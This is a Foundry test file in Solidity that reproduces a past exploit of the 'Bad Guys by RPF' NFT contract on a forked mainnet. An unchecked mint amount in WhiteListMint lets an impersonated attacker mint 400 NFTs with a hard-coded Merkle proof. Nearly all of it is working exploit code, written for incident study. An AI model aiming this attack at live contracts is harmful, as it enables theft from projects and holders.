// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Bad Guys by RPF Business Logic Flaw Exploit PoC

The exploit was due to the missing check for "chosenAmount" in the WhiteListMint function which allowed the attacker to pass the number of NFTs he/she wanted to mint.

To understand more about NFT Merkle Proof - https://www.youtube.com/watch?v=67vkL8XkoJ0

Etherscan tx - https://etherscan.io/tx/0xb613c68b00c532fe9b28a50a91c021d61a98d907d0217ab9b44cd8d6ae441d9f

forge test --contracts ./src/test/BadGuysbyRPF_exp.sol -vv*/

contract BadGuysbyRPFExploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade; //owner of Bad Guys by RPF
    address attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;

    IBadGuysRPFERC721 RPFContract = IBadGuysRPFERC721(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);
    bytes32[] merkleTree;

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_460_093); //fork mainnet at 15460093

        // There should be an easier way to do this
        // I tried passing it as whole array but did not work
        merkleTree.push(0xa3299324d1c59598e0dfa68de8d8c03d7492d88f6068cdd633a74eb9212e19e5);
        merkleTree.push(0x5dcd197f362a82daaf56545974db26aabfe335be4c7eef015d3d74ccea4bf511);
        merkleTree.push(0x18d716ad7f5113fe53b24a30288c6989dd04e6ad881be58b482d8d58f71c42da);
        merkleTree.push(0x97a98e092a76c15cef3709df2776cf974e2519231e79c9ad97c15a1835c5c4be);
        merkleTree.push(0x171696d6231b4a201927b35fe2dae4b91cefb62bef849a143560ebbb49cee5df);
        merkleTree.push(0xe89305151bbec931414ab9693bf886cf3b96dba00ca338b1c0aaae911b6dff35);
        merkleTree.push(0x69691b91227fa34a7a9a691d355fd6c466370928ddf3d50a347e894970f10079);
        merkleTree.push(0x78299a273b7d50bcb1d75df1694be463b9cc66c6520026b785615c4594dbb1ba);
        merkleTree.push(0xb297db4d926f0ebc26e098afcefa63d1d86d2e047ecbc36357192ef5240ea0ea);
        merkleTree.push(0xb875ced562ca82ce114152c899bbd085d230a17be452243fda43bf995774243e);
        merkleTree.push(0xd284a1831379548ff6bb0b5ad75ce8d0d1fea1cdc7b40b5f8d2e2307c9eda32c);
        merkleTree.push(0x7eff30a405cfce9989fe9d71e346d7b3616fa69b8251782898226268818f63fb);
        merkleTree.push(0x651ec4246f6e842692770a6ebd63396b4d62b52a3406522a02f182b8a16ba48c);
        merkleTree.push(0xee17656e8a839ac096dd5905744ada01278fc49b978260e9e3ddd92223cc18d7);
        merkleTree.push(0xce5c61c22a5d840c02b32aaebf73c9bc3c3d71c49f22b22c4f3cae4aa1fd557b);
    }

    function testExploit() public {
        //quick hack to enable Minting in Block#15460093
        //In actual hack the Mint was live in Block#15460094
        cheats.prank(owner);
        RPFContract.flipPauseMinting();

        console.log("[Before WhiteListMint] Attacker's Bad Guys by RPF NFT Balance: ", RPFContract.balanceOf(attacker));

        cheats.prank(attacker);
        RPFContract.WhiteListMint(merkleTree, 400); //mint 400 Bad Guys by RPF

        console.log("[After WhiteListMint]  Attacker's Bad Guys by RPF NFT Balance: ", RPFContract.balanceOf(attacker));
    }
}
